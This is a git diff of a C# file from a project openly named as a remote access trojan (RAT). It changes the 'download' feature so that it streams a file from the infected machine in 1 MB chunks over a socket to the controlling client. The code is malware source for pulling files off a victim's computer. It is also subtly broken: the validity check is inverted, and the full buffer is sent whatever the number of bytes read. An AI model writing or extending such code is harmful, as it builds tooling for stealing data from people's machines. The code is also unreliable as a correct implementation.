@@ -1,6 +1,5 @@
 ﻿using RAT.Interfaces;
-using System;
-using System.Diagnostics;
+using System.IO;
 
 namespace RAT.Logic.RatCommands.Features
 {
@@ -12,6 +11,7 @@ namespace RAT.Logic.RatCommands.Features
         private readonly ISocketConnectionSendingLogic _sendingLogic;
         private readonly ISocketConnectionConnectLogic _connectionLogic;
         private readonly ISocketConnectionDisconnectLogic _disconnectLogic;
+        private readonly IClientNotificationLogic _notificationLogic;
         private readonly IFileLogic _fileLogic;
 
         /// <summary>
@@ -20,16 +20,19 @@ namespace RAT.Logic.RatCommands.Features
         /// <param name="sendingLogic">Logic for data sending to client.</param>
         /// <param name="connectLogic">Logic for making/creating connection for sockets.</param>
         /// <param name="disconnectLogic">Logic socket disconnection.</param>
+        /// <param name="notificationLogic">Logic client notifications (sending messages to client).</param>
         public FileDownloader(
             ISocketConnectionSendingLogic sendingLogic,
             ISocketConnectionConnectLogic connectLogic,
             ISocketConnectionDisconnectLogic disconnectLogic,
-            IFileLogic fileLogic)
+            IFileLogic fileLogic,
+            IClientNotificationLogic notificationLogic)
         {
             _sendingLogic = sendingLogic;
             _connectionLogic = connectLogic;
             _disconnectLogic = disconnectLogic;
             _fileLogic = fileLogic;
+            _notificationLogic = notificationLogic;
         }
 
         /// <summary>
@@ -38,28 +41,30 @@ namespace RAT.Logic.RatCommands.Features
         /// <param name="path">Windows path of the file that should be downloaded.</param>
         public void DownloadFile(string path)
         {
-            var fileBytes = _fileLogic.GetFileBytesByPath(path);
-            if (fileBytes.Length == 0)
+            if (_fileLogic.IsValidFile(path))
             {
+                _notificationLogic.NotifyClient($"Invalid file on path: {path}");
                 return;
             }
 
-            this.SendFile(fileBytes);
-        }
-
-        /// <summary>
-        /// Sends file to client.
-        /// </summary>
-        /// <param name="fileBytes">File data in byte array.</param>
-        private void SendFile(byte[] fileBytes)
-        {
             var socketForFileDownload = _connectionLogic.GetConnectedSocketForFileDownload();
             if (!socketForFileDownload.Connected)
             {
                 return;
             }
 
-            _sendingLogic.SendDataToClient(socketForFileDownload, fileBytes, _sendingLogic.OnFileSend);
+            byte[] inputBuffer = new byte[1 * 1024 * 1024]; // Downloading by 1 MB
+            using (var stream = new FileStream(path, FileMode.Open))
+            {
+                int bytesRead = 0;
+                while ((bytesRead = stream.Read(inputBuffer, 0, inputBuffer.Length)) > 0)
+                {
+                    _sendingLogic.SendDataToClient(
+                        socketForFileDownload, inputBuffer, _sendingLogic.OnFileSend);
+                }
+            }
+
+            _notificationLogic.NotifyClient("Download finished\n");
             _disconnectLogic.DisconnectSocket(socketForFileDownload);
         }
     }
